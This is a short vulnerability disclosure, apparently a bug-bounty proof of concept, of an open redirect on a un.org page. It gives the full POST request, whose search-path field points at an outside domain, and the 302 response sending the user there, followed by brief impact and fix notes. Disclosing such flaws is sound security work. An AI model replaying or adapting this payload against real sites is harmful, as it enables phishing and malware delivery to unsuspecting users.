#  Open Redirect On un.org
* `Exploit Author:` **Nguyen Phu Hung (d4rkp0w4r)**
* `Url vuln:` https://www.un.org/sg/en/global-leadership/home

![](https://i.imgur.com/wPonK36.png)
# Payload
* Request
```python=
POST /sg/en/global-leadership/home HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: SSESSe8bea8d1ed8440047996de4a00142329=bL70GWJjq8AxmGhy8_3-lXvJhGjRmuVIn4ZRhnl5idk; citrix_ns_id_.www.un.org_%2F_wlf=AAAAAAXsJ6Ae-yLZ4NLMRrQCOjVisYa6Nmr3owiMk4KAutLc5cRcFxuAP7pgsCTc9msvfij4p9lWva1HdzCKWEJfV4a7TX3qxA0OJ7EhMGCiddYTPHvxiamtIRwp17FquyhIeGvla2QpIcGJQd6nEXi6RYSE&; citrix_ns_id_.www.un.org_%2F_wat=AAAAAAVdO-U9HRucDJSPDirtqqCmqeilDrlUVWnkGpODkN6ddtEm4TlRl1ZzedW5bRS_QceNTpSj8x1qAEbcUa8QAIMy2_W0lO5CHjg1HQAIHnNj2oh_86jJMo0vcYyDz_BrPRIvvODlRwFbHFqWXEfwCN8c&
Content-Length: 174
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Host: www.un.org
Connection: Keep-alive

custom_search_paths=http://nangluongvico.com.vn/poc.html&form_build_id=form-8hF7N_zK7Go4ywHcTgCZNR6BL5gGUdP5OSASJJnFM9Y&form_id=search_block_form&op=Search&search_block_form=
```
* Response
```python=
HTTP/1.1 302 Found
Date: Sat, 23 Jul 2022 07:28:58 GMT
Server: Apache
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
From-Origin: same
Content-Language: en
Permissions-Policy: interest-cohort=()
Location: https://nangluongvico.com.vn/poc.html
Content-Length: 0
Keep-Alive: timeout=5, max=68
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
# Impact 
* A remote attacker can redirect users from your website to a specified URL. This problem may assist an attacker to conduct phishing attacks, trojan distribution, spammers.

# Fix
* Your script should properly sanitize user input.

# POC VIDEO
https://drive.google.com/file/d/1UrP42GP2Bm0qrj9lHhffWZlkE_jliKon/view?usp=sharing
